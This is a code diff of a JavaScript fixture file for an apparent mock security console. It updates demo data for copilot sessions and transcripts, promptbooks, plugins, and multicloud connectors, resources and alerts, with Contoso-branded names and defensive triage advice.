+// Keep the discovery settings honest about the estate: the per-network counts and the
+// authenticated-scan results are derived from the inventory rather than typed in, so
+// the numbers on the settings page always match what the device list actually shows.
+DEVICE_DISCOVERY_SETTINGS.monitoredNetworks.forEach(net => {
+  if (net.state !== 'Monitored') return;
+  net.devices = DISCOVERED_DEVICES.filter(d => d.network === net.name).length
+              + DEVICES.filter(d => net.name === 'CORP-LAN').length;
+});
+DEVICE_DISCOVERY_SETTINGS.authenticatedScans.forEach(scan => {
+  const prefix = scan.targets.split('/')[0].split('.').slice(0, 3).join('.') + '.';
+  scan.found = DISCOVERED_DEVICES.filter(d =>
+    d.discoverySource === 'Authenticated scan' && d.ip.startsWith(prefix)).length;
+});
 
 const DEVICE_LIVE_RESPONSE = {
   'FIN-FS-02': {
@@ -3576,15 +5369,15 @@ const TECHNIQUE_TACTIC_LOOKUP = (() => {
 // === local-tasks fixtures (auto-merged by integrate.py — do not hand-edit between markers) ===
 // --- T01: out/t01-copilot-sessions.js ---
 const COPILOT_SESSIONS = [
-  { id: 'cs-001', name: 'Phishing wave triage - finance dept', owner: 'R. Vance', workspace: 'Primary', lastActivity: '2026-06-28T14:02:00Z', promptCount: 9, plugins: [ 'Microsoft Defender XDR', 'Microsoft Sentinel' ], pinned: true },
-  { id: 'cs-002', name: 'Ransomware indicator in SIEM alerts', owner: 'M. Okafor', workspace: 'SOC-EU', lastActivity: '2026-06-30T15:45:00Z', promptCount: 7, plugins: [ 'Microsoft Sentinel', 'Microsoft Defender XDR' ], pinned: false },
-  { id: 'cs-003', name: 'OAuth app misuse event timeline', owner: 'L. Harper', workspace: 'Primary', lastActivity: '2026-06-29T14:58:00Z', promptCount: 5, plugins: [ 'Microsoft Defender XDR', 'Microsoft Defender Threat Intelligence' ], pinned: true },
-  { id: 'cs-004', name: 'DLP alert - potential employee data exfiltration', owner: 'T. Martinez', workspace: 'Primary', lastActivity: '2026-06-27T15:30:00Z', promptCount: 11, plugins: [ 'Microsoft Purview', 'Microsoft Defender XDR' ], pinned: true },
-  { id: 'cs-005', name: 'Vulnerability scan prioritization - high risk', owner: 'E. Silva', workspace: 'Primary', lastActivity: '2026-06-30T17:40:00Z', promptCount: 8, plugins: [ 'Microsoft Defender XDR', 'Microsoft Sentinel' ], pinned: false },
-  { id: 'cs-006', name: 'Incident summary for C-suite: ransomware containment', owner: 'C. Williams', workspace: 'Primary', lastActivity: '2026-06-29T16:58:00Z', promptCount: 6, plugins: [ 'Microsoft Defender XDR' ], pinned: false },
-  { id: 'cs-007', name: 'TI analysis - suspicious DNS traffic', owner: 'J. Patel', workspace: 'Primary', lastActivity: '2026-06-30T14:25:00Z', promptCount: 3, plugins: [ 'Microsoft Sentinel', 'Microsoft Defender Threat Intelligence' ], pinned: true },
-  { id: 'cs-008', name: 'Risk matrix for recent sign-ins - SOC report', owner: 'K. Kim', workspace: 'SOC-EU', lastActivity: '2026-06-30T17:59:00Z', promptCount: 4, plugins: [ 'Microsoft Sentinel', 'Microsoft Entra' ], pinned: true },
-  { id: 'cs-009', name: 'INC-1042 phishing-to-OAuth investigation', owner: 'A. Lee', workspace: 'Primary', lastActivity: '2026-06-30T18:12:00Z', promptCount: 7, plugins: [ 'Microsoft Defender XDR', 'Microsoft Purview' ], pinned: true }
+  { id: 'cs-001', name: 'Phishing wave triage - finance dept', owner: 'R. Vance', workspace: 'Primary', lastActivity: '2026-06-28T14:02:00Z', promptCount: 9, plugins: [ 'Defender XDR', 'Sentinel' ], pinned: true },
+  { id: 'cs-002', name: 'Ransomware indicator in SIEM alerts', owner: 'M. Okafor', workspace: 'SOC-EU', lastActivity: '2026-06-30T15:45:00Z', promptCount: 7, plugins: [ 'Sentinel', 'Defender XDR' ], pinned: false },
+  { id: 'cs-003', name: 'OAuth app misuse event timeline', owner: 'L. Harper', workspace: 'Primary', lastActivity: '2026-06-29T14:58:00Z', promptCount: 5, plugins: [ 'Defender XDR', 'Defender Threat Intelligence' ], pinned: true },
+  { id: 'cs-004', name: 'DLP alert - potential employee data exfiltration', owner: 'T. Martinez', workspace: 'Primary', lastActivity: '2026-06-27T15:30:00Z', promptCount: 11, plugins: [ 'Purview', 'Defender XDR' ], pinned: true },
+  { id: 'cs-005', name: 'Vulnerability scan prioritization - high risk', owner: 'E. Silva', workspace: 'Primary', lastActivity: '2026-06-30T17:40:00Z', promptCount: 8, plugins: [ 'Defender XDR', 'Sentinel' ], pinned: false },
+  { id: 'cs-006', name: 'Incident summary for C-suite: ransomware containment', owner: 'C. Williams', workspace: 'Primary', lastActivity: '2026-06-29T16:58:00Z', promptCount: 6, plugins: [ 'Defender XDR' ], pinned: false },
+  { id: 'cs-007', name: 'TI analysis - suspicious DNS traffic', owner: 'J. Patel', workspace: 'Primary', lastActivity: '2026-06-30T14:25:00Z', promptCount: 3, plugins: [ 'Sentinel', 'Defender Threat Intelligence' ], pinned: true },
+  { id: 'cs-008', name: 'Risk matrix for recent sign-ins - SOC report', owner: 'K. Kim', workspace: 'SOC-EU', lastActivity: '2026-06-30T17:59:00Z', promptCount: 4, plugins: [ 'Sentinel', 'Entra' ], pinned: true },
+  { id: 'cs-009', name: 'INC-1042 phishing-to-OAuth investigation', owner: 'A. Lee', workspace: 'Primary', lastActivity: '2026-06-30T18:12:00Z', promptCount: 7, plugins: [ 'Defender XDR', 'Purview' ], pinned: true }
 ];
 
 // --- T02: out/t02-copilot-transcripts.js ---
@@ -3593,83 +5386,83 @@ const COPILOT_TRANSCRIPTS = [
     sessionId: 'cs-001',
     steps: [
       { role: 'analyst', text: 'Reviewing the incident details for the phishing wave. Which alerts are correlated?', plugin: 'none', skill: 'Incident summary', pinned: true },
-      { role: 'copilot', text: 'Two alerts are grouped: a malicious URL click and a mailbox activity spike on the same users.', plugin: 'Microsoft Defender XDR', skill: 'Correlation', pinned: false },
+      { role: 'copilot', text: 'Two alerts are grouped: a malicious URL click and a mailbox activity spike on the same users.', plugin: 'Defender XDR', skill: 'Correlation', pinned: false },
       { role: 'analyst', text: 'Which users clicked the link?', plugin: 'none', skill: 'Entity pivot', pinned: true },
-      { role: 'copilot', text: 'R. Vance and M. Okafor are the affected users in this lab case.', plugin: 'Microsoft Defender XDR', skill: 'Entity expansion', pinned: false }
+      { role: 'copilot', text: 'R. Vance and M. Okafor are the affected users in this lab case.', plugin: 'Defender XDR', skill: 'Entity expansion', pinned: false }
     ]
   },
   {
     sessionId: 'cs-002',
     steps: [
       { role: 'analyst', text: 'This SIEM feed looks like ransomware staging. What makes it suspicious?', plugin: 'none', skill: 'Threat hunting', pinned: true },
-      { role: 'copilot', text: 'The process chain shows archive creation, share discovery, and bulk file rename activity from a finance workstation.', plugin: 'Microsoft Sentinel', skill: 'KQL reasoning', pinned: false },
+      { role: 'copilot', text: 'The process chain shows archive creation, share discovery, and bulk file rename activity from a finance workstation.', plugin: 'Sentinel', skill: 'KQL reasoning', pinned: false },
       { role: 'analyst', text: 'Should we isolate the device?', plugin: 'none', skill: 'Response planning', pinned: true },
-      { role: 'copilot', text: 'Yes. Isolate the host, stop the service account, and preserve the alert set for incident follow-up.', plugin: 'Microsoft Defender XDR', skill: 'Containment', pinned: false }
+      { role: 'copilot', text: 'Yes. Isolate the host, stop the service account, and preserve the alert set for incident follow-up.', plugin: 'Defender XDR', skill: 'Containment', pinned: false }
     ]
   },
   {
     sessionId: 'cs-003',
     steps: [
       { role: 'analyst', text: 'I need to understand the OAuth app misuse timeline.', plugin: 'none', skill: 'Incident triage', pinned: true },
-      { role: 'copilot', text: 'The user clicked a phishing URL, then consented to DocViewer Pro with broad mail and files scopes.', plugin: 'Microsoft Defender XDR', skill: 'Timeline summarization', pinned: false },
+      { role: 'copilot', text: 'The user clicked a phishing URL, then consented to DocViewer Pro with broad mail and files scopes.', plugin: 'Defender XDR', skill: 'Timeline summarization', pinned: false },
       { role: 'analyst', text: 'What should I pivot on next?', plugin: 'none', skill: 'Entity pivots', pinned: true },
-      { role: 'copilot', text: 'Expand the user, the app registration, the source IP, and the mailbox activity in CloudAppEvents.', plugin: 'Microsoft Defender Threat Intelligence', skill: 'Entity expansion', pinned: false }
+      { role: 'copilot', text: 'Expand the user, the app registration, the source IP, and the mailbox activity in CloudAppEvents.', plugin: 'Defender Threat Intelligence', skill: 'Entity expansion', pinned: false }
     ]
   },
   {
     sessionId: 'cs-004',
     steps: [
       { role: 'analyst', text: 'Purview flagged external sharing of sensitive files. What is the likely issue?', plugin: 'none', skill: 'Policy triage', pinned: true },
-      { role: 'copilot', text: 'The file contains payment card data and was shared outside the tenant; the DLP policy tip is consistent with a real exfiltration risk.', plugin: 'Microsoft Purview', skill: 'DLP review', pinned: false },
+      { role: 'copilot', text: 'The file contains payment card data and was shared outside the tenant; the DLP policy tip is consistent with a real exfiltration risk.', plugin: 'Purview', skill: 'DLP review', pinned: false },
       { role: 'analyst', text: 'What are the response options?', plugin: 'none', skill: 'Response planning', pinned: true },
-      { role: 'copilot', text: 'Review the override request, notify the user owner, and escalate to insider-risk or eDiscovery if the pattern repeats.', plugin: 'Microsoft Purview', skill: 'Remediation', pinned: false }
+      { role: 'copilot', text: 'Review the override request, notify the user owner, and escalate to insider-risk or eDiscovery if the pattern repeats.', plugin: 'Purview', skill: 'Remediation', pinned: false }
     ]
   },
   {
     sessionId: 'cs-005',
     steps: [
       { role: 'analyst', text: 'Prioritize the vulnerability scan findings. What stands out?', plugin: 'none', skill: 'Exposure analysis', pinned: true },
-      { role: 'copilot', text: 'CodeGenius and PDFXpert Pro have exploit-available CVEs with multiple exposed devices, so they should be first in line for remediation.', plugin: 'Microsoft Defender XDR', skill: 'Prioritization', pinned: false },
+      { role: 'copilot', text: 'CodeGenius and PDFXpert Pro have exploit-available CVEs with multiple exposed devices, so they should be first in line for remediation.', plugin: 'Defender XDR', skill: 'Prioritization', pinned: false },
       { role: 'analyst', text: 'Can this become a repeatable workflow?', plugin: 'none', skill: 'Operationalization', pinned: true },
-      { role: 'copilot', text: 'Yes. Turn the pattern into a tracker item and route the remediation request to IT with an expiry date.', plugin: 'Microsoft Sentinel', skill: 'Workflow suggestion', pinned: false }
+      { role: 'copilot', text: 'Yes. Turn the pattern into a tracker item and route the remediation request to IT with an expiry date.', plugin: 'Sentinel', skill: 'Workflow suggestion', pinned: false }
     ]
   },
   {
     sessionId: 'cs-006',
     steps: [
       { role: 'analyst', text: 'Summarize the ransomware incident for leadership.', plugin: 'none', skill: 'Executive summary', pinned: true },
-      { role: 'copilot', text: 'The incident is a confirmed ransomware event with service-account driven encryption, mapped network shares, and containment already underway.', plugin: 'Microsoft Defender XDR', skill: 'Summarization', pinned: false },
+      { role: 'copilot', text: 'The incident is a confirmed ransomware event with service-account driven encryption, mapped network shares, and containment already underway.', plugin: 'Defender XDR', skill: 'Summarization', pinned: false },
       { role: 'analyst', text: 'What should be included in the headline?', plugin: 'none', skill: 'Decision support', pinned: true },
-      { role: 'copilot', text: 'State the scope, containment actions, and restoration plan; avoid speculation about dwell time until forensics confirms it.', plugin: 'Microsoft Defender XDR', skill: 'Leadership guidance', pinned: false }
+      { role: 'copilot', text: 'State the scope, containment actions, and restoration plan; avoid speculation about dwell time until forensics confirms it.', plugin: 'Defender XDR', skill: 'Leadership guidance', pinned: false }
     ]
   },
   {
     sessionId: 'cs-007',
     steps: [
       { role: 'analyst', text: 'These DNS lookups look noisy. What do you see?', plugin: 'none', skill: 'Threat hunting', pinned: true },
-      { role: 'copilot', text: 'The burst contains repeated NXDOMAIN queries from one host plus suspicious responses from known proxy ranges, which is consistent with tunneling or beaconing.', plugin: 'Microsoft Sentinel', skill: 'Pattern detection', pinned: false },
+      { role: 'copilot', text: 'The burst contains repeated NXDOMAIN queries from one host plus suspicious responses from known proxy ranges, which is consistent with tunneling or beaconing.', plugin: 'Sentinel', skill: 'Pattern detection', pinned: false },
       { role: 'analyst', text: 'Can I ground this in indicators?', plugin: 'none', skill: 'Indicator enrichment', pinned: true },
-      { role: 'copilot', text: 'Yes. Save the IPs and domains as indicators, then validate whether they appear in other alerts or in the hunting graph.', plugin: 'Microsoft Defender Threat Intelligence', skill: 'TI enrichment', pinned: false }
+      { role: 'copilot', text: 'Yes. Save the IPs and domains as indicators, then validate whether they appear in other alerts or in the hunting graph.', plugin: 'Defender Threat Intelligence', skill: 'TI enrichment', pinned: false }
     ]
   },
   {
     sessionId: 'cs-008',
     steps: [
       { role: 'analyst', text: 'Are these risky sign-ins likely compromise or travel?', plugin: 'none', skill: 'Identity triage', pinned: true },
-      { role: 'copilot', text: 'The sign-in from an unfamiliar region is paired with risk detections, so the lab should treat it as suspicious until the user validates the activity.', plugin: 'Microsoft Entra', skill: 'Risk interpretation', pinned: false },
+      { role: 'copilot', text: 'The sign-in from an unfamiliar region is paired with risk detections, so the lab should treat it as suspicious until the user validates the activity.', plugin: 'Entra', skill: 'Risk interpretation', pinned: false },
       { role: 'analyst', text: 'What would you do next?', plugin: 'none', skill: 'Response planning', pinned: true },
-      { role: 'copilot', text: 'Confirm or dismiss the risk, then decide whether to require password reset and revoke sessions.', plugin: 'Microsoft Defender XDR', skill: 'Containment guidance', pinned: false }
+      { role: 'copilot', text: 'Confirm or dismiss the risk, then decide whether to require password reset and revoke sessions.', plugin: 'Defender XDR', skill: 'Containment guidance', pinned: false }
     ]
   },
   {
     sessionId: 'cs-009',
     steps: [
       { role: 'analyst', text: 'Investigate INC-1042 end to end and decide if we contain the user.', plugin: 'none', skill: 'Agentic prompt', pinned: true },
-      { role: 'copilot', text: 'The incident is a phishing-to-OAuth chain: user click, app consent, and follow-on mailbox access. Expand the user, app, and IP entities next.', plugin: 'Microsoft Defender XDR', skill: 'Incident summary', pinned: false },
+      { role: 'copilot', text: 'The incident is a phishing-to-OAuth chain: user click, app consent, and follow-on mailbox access. Expand the user, app, and IP entities next.', plugin: 'Defender XDR', skill: 'Incident summary', pinned: false },
       { role: 'analyst', text: 'What tool calls should I make?', plugin: 'none', skill: 'Planning', pinned: true },
-      { role: 'copilot', text: 'Query CloudAppEvents for DocViewer Pro, inspect SigninLogs for the unfamiliar IP, and review the mailbox for scope abuse.', plugin: 'Microsoft Purview', skill: 'Tool planning', pinned: false },
+      { role: 'copilot', text: 'Query CloudAppEvents for DocViewer Pro, inspect SigninLogs for the unfamiliar IP, and review the mailbox for scope abuse.', plugin: 'Purview', skill: 'Tool planning', pinned: false },
       { role: 'analyst', text: 'Verdict?', plugin: 'none', skill: 'Decisioning', pinned: true },
-      { role: 'copilot', text: 'Contain the user, revoke sessions, remove consent, and keep the case open until hunting shows no further abuse.', plugin: 'Microsoft Defender XDR', skill: 'Verdict', pinned: false }
+      { role: 'copilot', text: 'Contain the user, revoke sessions, remove consent, and keep the case open until hunting shows no further abuse.', plugin: 'Defender XDR', skill: 'Verdict', pinned: false }
     ]
   }
 ];
@@ -3679,7 +5472,7 @@ const COPILOT_PROMPTBOOKS = [
   {
     id: 'pb-01',
     name: 'Incident investigation',
-    source: 'Microsoft',
+    source: 'Contoso',
     description: 'Step-by-step triage of an incident.',
     inputs: ['Incident ID'],
     prompts: ['Summarize incident <ID>', 'List impacted entities', 'List related alerts', 'Suggest response actions', 'Draft an executive summary']
@@ -3687,7 +5480,7 @@ const COPILOT_PROMPTBOOKS = [
   {
     id: 'pb-02',
     name: 'Suspicious script analysis',
-    source: 'Microsoft',
+    source: 'Contoso',
     description: 'Analyze suspicious scripts for potential threats.',
     inputs: [],
     prompts: ['Identify the purpose of <script>', 'Check against known malware patterns', 'Examine network activity related to <script>', 'Suggest next steps']
@@ -3695,7 +5488,7 @@ const COPILOT_PROMPTBOOKS = [
   {
     id: 'pb-03',
     name: 'Threat actor profile',
-    source: 'Microsoft',
+    source: 'Contoso',
     description: 'Develop a profile of the threat actor based on attack patterns.',
     inputs: ['Device name'],
     prompts: ['List recent activity by <device>', 'Identify common tactics and techniques used', 'Suggest potential motivations']
@@ -3703,7 +5496,7 @@ const COPILOT_PROMPTBOOKS = [
   {
     id: 'pb-04',
     name: 'Vulnerability impact assessment',
-    source: 'Microsoft',
+    source: 'Contoso',
     description: 'Assess the risk of a vulnerability exploit.',
     inputs: [],
     prompts: ['Describe the vulnerability', 'Estimate potential damage', 'Suggest remediation steps']
@@ -3711,7 +5504,7 @@ const COPILOT_PROMPTBOOKS = [
   {
     id: 'pb-05',
     name: 'User compromise assessment',
-    source: 'Microsoft',
+    source: 'Contoso',
     description: 'Evaluate the risk of user data breaches.',
     inputs: [],
     prompts: ['Identify potential access vectors', 'Determine impacted users and data', 'Suggest containment actions']
@@ -3719,7 +5512,7 @@ const COPILOT_PROMPTBOOKS = [
   {
     id: 'pb-06',
     name: 'Email threat triage',
-    source: 'Microsoft',
+    source: 'Contoso',
     description: 'Triage incoming emails for potential threats.',
     inputs: ['Incident ID'],
     prompts: ['Summarize email content <ID>', 'Check against known phishing patterns', 'Analyze sender behavior', 'Suggest actions']
@@ -3746,7 +5539,7 @@ const COPILOT_PROMPTBOOKS = [
 const COPILOT_PLUGINS = [
   {
     id: 'pl-01',
-    name: 'Microsoft Defender XDR - Incident context',
+    name: 'Defender XDR - Incident context',
     category: 'First-party',
     status: 'On',
     description: 'Summarizes incidents, alerts, and entity pivots from Defender XDR.',
@@ -3754,7 +5547,7 @@ const COPILOT_PLUGINS = [
   },
   {
     id: 'pl-02',
-    name: 'Microsoft Sentinel - Workspace context',
+    name: 'Sentinel - Workspace context',
     category: 'First-party',
     status: 'On',
     description: 'Pulls hunting queries, incidents, and workbook context from Sentinel.',
@@ -3762,7 +5555,7 @@ const COPILOT_PLUGINS = [
   },
   {
     id: 'pl-03',
-    name: 'Microsoft Entra - Identity context',
+    name: 'Entra - Identity context',
     category: 'First-party',
     status: 'On',
     description: 'Brings sign-in risk, user risk, and directory audit details into answers.',
@@ -3770,7 +5563,7 @@ const COPILOT_PLUGINS = [
   },
   {
     id: 'pl-04',
-    name: 'Microsoft Intune - Device context',
+    name: 'Intune - Device context',
     category: 'First-party',
     status: 'On',
     description: 'Adds device posture and management context for endpoint questions.',
@@ -3778,7 +5571,7 @@ const COPILOT_PLUGINS = [
   },
   {
     id: 'pl-05',
-    name: 'Microsoft Defender Threat Intelligence - Indicator enrichment',
+    name: 'Defender Threat Intelligence - Indicator enrichment',
     category: 'First-party',
     status: 'Off',
     description: 'Enriches IP, domain, and file indicators with threat intelligence context.',
@@ -3786,7 +5579,7 @@ const COPILOT_PLUGINS = [
   },
   {
     id: 'pl-06',
-    name: 'Microsoft Purview - Content security context',
+    name: 'Purview - Content security context',
     category: 'First-party',
     status: 'On',
     description: 'Grounds answers in DLP, audit, and eDiscovery content clues.',
@@ -3795,7 +5588,7 @@ const COPILOT_PLUGINS = [
   {
     id: 'pl-07',
     name: 'Fabrikam SIEM - Custom triage bridge',
-    category: 'Non-Microsoft',
+    category: 'Third-party',
     status: 'Off',
     description: 'Adds a fictional third-party alert feed used for lab comparisons.',
     setupNote: 'Enable the connector only when cross-platform alert blending is being studied.'
@@ -3803,10 +5596,10 @@ const COPILOT_PLUGINS = [
   {
     id: 'pl-08',
     name: 'NetScope CASB - Cloud app risk feed',
-    category: 'Non-Microsoft',
+    category: 'Third-party',
     status: 'Off',
     description: 'Represents a third-party cloud app risk source with OAuth and file activity.',
-    setupNote: 'Use it as a stand-in for non-Microsoft app governance context.'
+    setupNote: 'Use it as a stand-in for non-Contoso app governance context.'
   },
   {
     id: 'pl-09',
@@ -4004,121 +5797,198 @@ const TVM_EXPOSURE_TREND = [
 ];
 
 // --- T07: out/t07-multicloud.js ---
+// Defender for Cloud security connectors. A connector is an Azure resource, so
+// `id` uses the real ARM path shape and the cloud-native identifiers follow each
+// provider's own conventions: AWS accounts are 12 digits and authenticate with an
+// assumed IAM role; GCP has a string project ID plus a numeric project number and
+// authenticates through workload identity federation.
 const MC_CONNECTORS = [
   {
-    id: 'connector-a-aaaa1111',
+    id: '/subscriptions/8a41c7d2-5e93-4b16-9f70-2c6d05ea38b1/resourceGroups/rg-security-prod/providers/Cloud.Security/securityConnectors/contoso-aws-prod',
+    name: 'contoso-aws-prod',
     cloud: 'AWS',
-    accountId: '111122223333',
+    accountId: '481512376904',
+    accountAlias: 'contoso-production',
+    scope: 'Single account',
+    regions: ['us-east-1', 'eu-west-1'],
+    authentication: 'Assume role',
+    principal: 'arn:aws:iam::481512376904:role/DefenderForCloud-Scanner',
+    deployment: 'CloudFormation stack DefenderForCloud-481512376904',
     plans: ['CSPM','Servers'],
     health: 'Healthy',
+    healthDetail: 'All enabled plans are reporting. The last inventory scan completed with no permission errors.',
     lastSync: '2026-06-15T12:00:00.000Z'
   },
   {
-    id: 'connector-b-bbbb2222',
+    id: '/subscriptions/8a41c7d2-5e93-4b16-9f70-2c6d05ea38b1/resourceGroups/rg-security-prod/providers/Cloud.Security/securityConnectors/contoso-gcp-prod',
+    name: 'contoso-gcp-prod',
     cloud: 'GCP',
-    accountId: 'proj-aaaa1111',
-    plans: ['Databases','Containers'],
+    accountId: 'contoso-prod-4821',
+    projectNumber: '638274195063',
+    organizationId: '419028375162',
+    scope: 'Single project',
+    regions: ['us-central1', 'europe-west3'],
+    authentication: 'Workload identity federation',
+    principal: 'defender-cspm@contoso-prod-4821.iam.gserviceaccount.com',
+    deployment: 'Cloud Shell bootstrap — workload identity pool defender-for-cloud',
+    plans: ['CSPM','Containers','Databases'],
     health: 'Warning',
+    healthDetail: 'Databases plan is degraded: the Cloud SQL Admin API is not enabled on contoso-prod-4821, so Cloud SQL instances in europe-west3 are not being assessed.',
     lastSync: '2026-06-14T18:30:00.000Z'
   }
 ];
 
+// Multicloud inventory. Names, identifiers, and regions follow each provider's own
+// conventions — AWS EC2 shows up by instance ID with its Name tag alongside, GCP by
+// resource name — because that is how these rows read in the real portal. `alerts`
+// matches the alerts that actually exist in MC_ALERTS rather than a flat count.
 const MC_RESOURCES = [
   {
     id: 'res-a-bbbb2222-7',
     cloud: 'GCP',
     type: 'Container cluster',
-    name: 'nw-ops-cluster-8',
+    name: 'gke-contoso-payments-euw3',
+    resourceId: 'projects/proj-aaaa1111/locations/europe-west3/clusters/gke-contoso-payments-euw3',
     region: 'europe-west3',
-    riskLevel: 'High'
+    riskLevel: 'High',
+    exposure: 'Control plane authorized networks allow 0.0.0.0/0',
+    alerts: 0,
+    recs: 5
   },
   {
     id: 'res-b-aaaa1111-9',
     cloud: 'AWS',
-    type: 'VM instance',
-    name: 'nw-ops-vm-7',
+    type: 'EC2 instance',
+    name: 'i-0b8d41f7c9a2e6f35',
+    displayName: 'prd-web-euw1-03',
+    resourceId: 'arn:aws:ec2:eu-west-1:111122223333:instance/i-0b8d41f7c9a2e6f35',
     region: 'eu-west-1',
-    riskLevel: 'Medium'
+    riskLevel: 'Medium',
+    exposure: 'Security group allows 22/tcp from 0.0.0.0/0',
+    alerts: 1,
+    recs: 4
   },
   {
     id: 'res-c-bbbb2222-3',
     cloud: 'GCP',
-    type: 'VM instance',
-    name: 'nw-ops-web-server-6',
+    type: 'Compute instance',
+    name: 'contoso-prod-web-uc1-a3',
+    resourceId: 'projects/proj-aaaa1111/zones/us-central1-a/instances/contoso-prod-web-uc1-a3',
     region: 'us-central1',
-    riskLevel: 'Low'
+    riskLevel: 'Low',
+    exposure: 'Behind external HTTPS load balancer',
+    alerts: 0,
+    recs: 2
   },
   {
     id: 'res-d-bbbb2222-4',
     cloud: 'GCP',
-    type: 'VM instance',
-    name: 'nw-ops-backend-server-5',
+    type: 'Compute instance',
+    name: 'contoso-prod-batch-uc1-b7',
+    resourceId: 'projects/proj-aaaa1111/zones/us-central1-b/instances/contoso-prod-batch-uc1-b7',
     region: 'us-central1',
-    riskLevel: 'None'
+    riskLevel: 'None',
+    exposure: 'Private, no external IP',
+    alerts: 0,
+    recs: 0
   },
   {
     id: 'res-e-bbbb2222-6',
     cloud: 'GCP',
-    type: 'SQL database',
-    name: 'nw-ops-user-database-10',
+    type: 'Cloud SQL instance',
+    name: 'contoso-prod-users-sql',
+    resourceId: 'projects/proj-aaaa1111/instances/contoso-prod-users-sql',
     region: 'europe-west3',
-    riskLevel: 'High'
+    riskLevel: 'High',
+    exposure: 'Public IP with authorized network 0.0.0.0/0',
+    alerts: 0,
+    recs: 4
   },
   {
     id: 'res-f-bbbb2222-8',
     cloud: 'GCP',
-    type: 'VM instance',
-    name: 'nw-ops-api-server-9',
+    type: 'Compute instance',
+    name: 'contoso-prod-api-uc1-a2',
+    resourceId: 'projects/proj-aaaa1111/zones/us-central1-a/instances/contoso-prod-api-uc1-a2',
     region: 'us-central1',
-    riskLevel: 'Low'
+    riskLevel: 'Low',
+    exposure: 'Private, SSH through Identity-Aware Proxy only',
+    alerts: 0,
+    recs: 2
   },
   {
     id: 'res-g-bbbb2222-0',
     cloud: 'GCP',
     type: 'Storage bucket',
-    name: 'nw-ops-data-store-3',
+    name: 'contoso-prod-datalake-uc1',
+    resourceId: 'projects/_/buckets/contoso-prod-datalake-uc1',
     region: 'us-central1',
-    riskLevel: 'None'
+    riskLevel: 'None',
+    exposure: 'Uniform bucket-level access, no public members',
+    alerts: 0,
+    recs: 1
   },
   {
     id: 'res-h-bbbb2222-1',
-    cloud: 'GCP',
-    type: 'VM instance',
-    name: 'nw-ops-frontend-server-4',
-    region: 'us-central1',
-    riskLevel: 'Low'
+    cloud: 'AWS',
+    type: 'EC2 instance',
+    name: 'i-0d27a9e4c15b83f60',
+    displayName: 'prd-api-use1-01',
+    resourceId: 'arn:aws:ec2:us-east-1:111122223333:instance/i-0d27a9e4c15b83f60',
+    region: 'us-east-1',
+    riskLevel: 'Low',
+    exposure: 'Private subnet, load balancer origin only',
+    alerts: 0,
+    recs: 2
   },
   {
     id: 'res-i-bbbb2222-5',
-    cloud: 'GCP',
-    type: 'VM instance',
-    name: 'nw-ops-auth-server-2',
-    region: 'us-central1',
-    riskLevel: 'Low'
+    cloud: 'AWS',
+    type: 'EC2 instance',
+    name: 'i-05f6b0c3d8a71e492',
+    displayName: 'prd-bastion-euw1',
+    resourceId: 'arn:aws:ec2:eu-west-1:111122223333:instance/i-05f6b0c3d8a71e492',
+    region: 'eu-west-1',
+    riskLevel: 'Low',
+    exposure: 'Management ports restricted to the bastion security group',
+    alerts: 0,
+    recs: 3
   },
   {
     id: 'res-j-bbbb2222-2',
     cloud: 'GCP',
     type: 'Container cluster',
-    name: 'nw-ops-k8s-cluster-0',
+    name: 'gke-contoso-prod-euw3',
+    resourceId: 'projects/proj-aaaa1111/locations/europe-west3/clusters/gke-contoso-prod-euw3',
     region: 'europe-west3',
-    riskLevel: 'Medium'
+    riskLevel: 'Medium',
+    exposure: 'Workload identity bound to cluster-admin',
+    alerts: 1,
+    recs: 3
   },
   {
     id: 'res-k-bbbb2222-10',
-    cloud: 'GCP',
-    type: 'Storage bucket',
-    name: 'nw-ops-backup-store-7',
-    region: 'us-central1',
-    riskLevel: 'Low'
+    cloud: 'AWS',
+    type: 'S3 bucket',
+    name: 'contoso-prod-artifacts-euw1',
+    resourceId: 'arn:aws:s3:::contoso-prod-artifacts-euw1',
+    region: 'eu-west-1',
+    riskLevel: 'Low',
+    exposure: 'Bucket policy grants cross-account read',
+    alerts: 0,
+    recs: 2
   },
   {
     id: 'res-l-bbbb2222-9',
-    cloud: 'GCP',
-    type: 'Storage bucket',
-    name: 'nw-ops-media-store-8',
-    region: 'us-central1',
-    riskLevel: 'Low'
+    cloud: 'AWS',
+    type: 'S3 bucket',
+    name: 'contoso-prod-backups-use1',
+    resourceId: 'arn:aws:s3:::contoso-prod-backups-use1',
+    region: 'us-east-1',
+    riskLevel: 'Low',
+    exposure: 'Block public access enabled, versioning on',
+    alerts: 0,
+    recs: 1
   }
 ];
 
@@ -4128,24 +5998,61 @@ const MC_ALERTS = [
     cloud: 'GCP',
     title: 'Unusual access event on container cluster',
     severity: 'High',
-    resource: 'nw-ops-k8s-cluster-0',
+    resource: 'gke-contoso-prod-euw3',
     type: 'Kubernetes workload',
-    status: 'New',
+    status: 'Active',
     time: '2026-06-28T12:42:00Z',
+    endTime: '2026-06-28T12:44:00Z',
     tactics: ['Execution', 'Privilege Escalation'],
-    description: 'An unexpected role was assumed by an identity in the container cluster, indicating potential misuse or unauthorized access.'
+    description: 'An unexpected role was assumed by an identity in the container cluster, indicating potential misuse or unauthorized access.',
+    plan: 'Defender for Containers (GCP connector)',
+    scope: 'proj-aaaa1111',
+    incidentId: 'dfc-inc-03',
+    entities: [
+      { type: 'Container cluster', value: 'gke-contoso-prod-euw3' },
+      { type: 'Account',           value: 'ops-shared-admin' },
+      { type: 'Role',              value: 'cluster-admin' },
+    ],
+    evidence: { 'Region': 'europe-west3', 'Namespace': 'payments', 'Connector': 'GCP project proj-aaaa1111', 'Role assumed': 'cluster-admin', 'Prior use of this role by identity': 'None' },
+    mitigation: [
+      'Remove the elevated role binding and confirm the workload identity only holds what it needs.',
+      'Check whether the same operator account is used in the connected AWS account.',
+    ],
+    recommendations: [
+      'GCP container clusters should not grant cluster-admin to workload identities',
+      'Operator accounts should not be shared across cloud providers',
+    ]
   },
   {
     id: 'alert-b-bbbb2222-3',
     cloud: 'AWS',
     title: 'Unsuccessful login attempts on keypair management service',
     severity: 'Medium',
-    resource: 'nw-ops-vm-7',
-    type: 'Virtual machine',
-    status: 'In progress',
+    resource: 'i-0b8d41f7c9a2e6f35',
+    type: 'EC2 instance',
+    status: 'Active',
     time: '2026-06-28T11:55:00Z',
+    endTime: '2026-06-28T12:10:00Z',
     tactics: ['Credential Access'],
-    description: 'A series of failed sign-on attempts were detected, which could indicate a compromised key pair or brute-force attack.'
+    description: 'A series of failed sign-on attempts were detected, which could indicate a compromised key pair or brute-force attack.',
+    plan: 'Defender for Servers (AWS connector)',
+    scope: '111122223333',
